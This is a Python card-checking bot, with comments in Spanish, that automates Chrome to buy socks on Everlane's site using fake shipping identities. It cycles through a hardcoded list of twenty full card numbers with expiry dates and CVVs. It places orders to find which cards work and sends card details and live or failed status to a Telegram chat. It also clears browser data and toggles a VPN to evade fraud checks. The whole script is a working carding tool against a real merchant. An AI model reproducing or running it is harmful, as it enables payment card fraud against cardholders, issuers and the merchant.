### Hecho el 02/08/2008 por SyntaxErr0r ###
import random
from pg_bot import PyAutoGUI_Bot
from funciones import generar_identidad, telegram, separar_cc, crear_lista

# Variables y Objetos

bot = PyAutoGUI_Bot()
url = 'https://www.everlane.com/products/unisex-diamond-stitch-sock-lavender'

# Funciones

def preparar_worksplace():

    if bot.locate('everlane', click=False) == True or bot.locate('payment_method') == True: 
        print('Usando el entorno de trabajo actual')    

    else:
        print('Preparando entorno de trabajo')
        # Necesitamos hacer que abra el Navegador, por defecto: chrome

        bot.press('win')
        bot.pause(0.2)
        bot.write('chrome')
        bot.pause(0.2)
        bot.press('enter')

        # Abrimos Everlane

        bot.pause(1)
        bot.press_both('ctrl', 'l')
        bot.copypaste(url)
        bot.press('enter')

        # Ponemos una pausa por si encontramos cualquier popup

        bot.pause(5)

        if bot.locate('get_early_access', click=False):
            bot.locate('no_thanks') or bot.locate('quit')
        elif bot.locate('get_10_off', click=False):
            bot.locate('no_thanks') or bot.locate('quit')

        bot.locate('sock', check=True, click=False)
        bot.scroll(-250)
        bot.locate('talla_M', wait=0.5) or bot.locate('talla_L')
        bot.locate('agregar_carrito', wait=0.1)
        bot.locate('your_cart', check=True, click=False)
        bot.locate('checkout')

        # Llenamos los datos de forma random y vamos haciendo scroll
        id = generar_identidad()

        bot.locate('enter_email', check=True, click=False)
        bot.locate('email_address')
        bot.copypaste(id[2])
        bot.locate('continue_to_shipping') or bot.press('enter')
        bot.scroll(-200)
        bot.locate('shipping', check=True, click=False)
        bot.locate('full_name')
        print('Nombre')
        bot.pause(0.05)
        bot.write(f"{id[0]} {id[1]}")
        bot.press('tab') # Saltamos la casilla de Full Name
        bot.press('tab') # Saltamos la casilla de Country
        bot.pause(0.05)
        print('Direccion')
        bot.write(str(random.randint(1500,1700)))
        bot.press('tab') # Saltamos la casilla de Street Address
        bot.press('tab') # Saltamos la casilla de Apartment
        bot.press('tab') # Saltamos la casilla de PO Box
        bot.pause(0.05)
        print('Ciudad')
        bot.write('Doral')
        bot.press('tab') # Saltamos la casilla de City
        bot.write('fl')
        bot.pause(0.05)
        print('Estado')
        bot.press('enter')
        bot.press('tab') # Saltamos la casilla de State
        bot.pause(0.05)
        print('Zip Code')
        bot.write('33191')
        bot.press('tab') # Saltamos la casilla de Zip Code
        bot.press('tab') # Saltamos la casilla de Phone Number
        bot.pause(0.05)
        bot.scroll(-300)
        bot.locate('see_shipping_options', 1)
        bot.locate('select_shipping_option', check=True, click=False)
        bot.locate('continue_to_payment', wait=0.5) or bot.press('enter')
        bot.pause(0.20)
        bot.scroll(-500)

def livear(cc_namso, current, total):
    print(f"Current: {cc_namso}")
    cc = separar_cc(cc_namso)

    if bot.locate('cc'):
        bot.pause(0.2)
        print(f'CC: {cc[0]}')
        bot.write(cc[0])
        bot.pause(0.2)
        bot.write(cc[1])

        bot.pause(0.2)
        print(f"MMYY: {cc[1]}/{cc[2][2:4]}")
        bot.write(cc[2][2:4])

        bot.pause(0.2)
        print(f"CVC: {cc[3]}")
        bot.write(cc[3])

        bot.pause(0.2)
        bot.locate('credit_card')
        bot.scroll(-500)
        bot.pause(1)
        bot.locate('review_order', check=True)

        bot.pause(0.5)
        bot.locate('place_order')

    elif bot.locate('payment_method', click=False) or bot.locate('credit_card', click=False):

        # Si encontramos el boton de editar o cerrar
        bot.locate('edit') or bot.locate('close')
        bot.pause(0.3)

        # Obtenemos la posicion de credit card (Boton Azul)
        # Para poder mover el raton de forma relativa sobre esa posicion
        bot.locate('credit_card', check=True, click=False)
        credit_card = bot.get_position('credit_card')
        
        # Seleccionamos y escribimos la CC
        bot.move(credit_card[0]+100, credit_card[1]+66, click=True)
        bot.pause(0.3)
        bot.press_both('ctrl', 'a')
        bot.pause(0.3)
        print(f'CC: {cc[0]}')
        bot.copypaste(cc[0])

        # Seleccionamos y escribimos el MMYY
        if bot.locate('mmyy',wait=0.2):
            bot.pause(0.3)
        
        else:
            print('Corriendo ELSE MMYY')
            bot.move(credit_card[0]+293, credit_card[1]+66, click=True)
            bot.pause(0.3)
            bot.press_both('ctrl', 'a')
            bot.pause(0.3)

        print(f"MMYY: {cc[1]}/{cc[2][2:4]}")
        bot.copypaste(cc[1])
        bot.copypaste(cc[2][2:4])

        # Seleccionamos el CVC

        if bot.locate('cvv'):
            pass
        else:
            print('Corriendo ELSE CVC')
            bot.move(credit_card[0]+447, credit_card[1]+66, click=True)
            bot.pause(0.3)
            bot.press_both('ctrl', 'a')
            bot.pause(0.3)

        print(f"CVC: {cc[3]}")
        bot.copypaste(cc[3])
        bot.pause(0.3)

        # Hacemos click en credit card seguido de un scroll
        bot.press('enter')
        bot.pause(0.2)
        bot.press('end')
        bot.pause(0.3)
        
        if bot.locate('review_order'):
            pass
        else: 
            bot.locate('review_order', check=True)

        bot.locate('place_order', wait=1)

    # Validamos si fue success o failed

    # Probablemente hay que hacer un bucle aqui
    bot.pause(3)

    if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
        print(f'CC: {cc} - Live!')
        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}", '-726102881')
        bot.press_both('ctrl', 'l')
        bot.copypaste('chrome://settings/clearBrowserData')
        bot.press('enter')
        bot.locate('clear_data')
        bot.pause(0.10)
        bot.press_both('alt', 'f4')

        preparar_worksplace()

    elif bot.locate('error1', click=False):
        print('There was a problem processing your card. Please call your card issuer or try a different card.')
        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
    elif bot.locate('out_funds', click=False):
        print('Your card appears to be out of funds. Please try a new one.')
        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
    elif bot.locate('unable_to_add', click=False):
        print("Unable to add payment method. Please try again.")
        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCurrent: {current}/{total}\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]} CVV: {cc[3]}\n\n📝 Details:\nUnable to add payment method. Please try again.", '-726102881')
        
        bot.locate('urban_logo')
        bot.locate('urban_connected', check=True, click=False)
        bot.locate('urban_turn_off')
        bot.locate('urban_turn_on', wait=0.5)

        preparar_worksplace()

    

    
# Logica

def main():

    ccs = """
5217295329247245|11|2023|074
5217295329250504|11|2023|364
5217295329200871|11|2023|206
5217295329241107|11|2023|200
5217295329203412|11|2023|353
5217295329253466|11|2023|402
5217295329215614|11|2023|122
5217295329267680|11|2023|000
5217295329287647|11|2023|002
5217295329258861|11|2023|076
5217295329210268|11|2023|225
5217295329262723|11|2023|874
5217295329254480|11|2023|444
5217295329287035|11|2023|646
5217295329286672|11|2023|066
5217295329261113|11|2023|823
5217295329253227|11|2023|807
5217295329238756|11|2023|246
5217295329270312|11|2023|021
5217295329264570|11|2023|013
    """

    preparar_worksplace()

    cc_for_use = crear_lista(ccs)

    total = len(cc_for_use)
    current = 1

    for cc in cc_for_use:
        
        livear(cc, current, total)
        current += 1
        
if __name__ == '__main__':

    try: 
        main()

    except KeyboardInterrupt:
        exit()

    


